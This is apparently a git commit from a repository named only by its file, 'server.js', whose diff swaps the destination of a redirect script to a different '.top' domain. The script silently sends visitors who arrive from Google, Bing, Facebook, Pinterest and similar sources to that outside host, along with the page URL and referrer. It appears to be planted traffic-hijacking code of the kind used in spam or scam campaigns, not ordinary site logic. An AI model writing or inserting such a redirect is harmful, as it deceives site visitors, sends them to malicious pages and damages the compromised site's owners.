ee04162169c2601c531dd625f8095795177b0262
xda facezero <xdafacezero@gmail.com>
2020-09-28 18:11:03 +0700

    Update server.js

--- server.js
+++ server.js
@@ -1,2 +1,2 @@
-var ars = 'https://www.battleofbrokenhill.com';
+var ars = 'https://mtsttfjq.top/khong-motma11-uvoHhJJdFhyy5qihdY6o';
 if(['.google.', 'bing.', 'yandex.', 'facebook.', 'pinterest.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
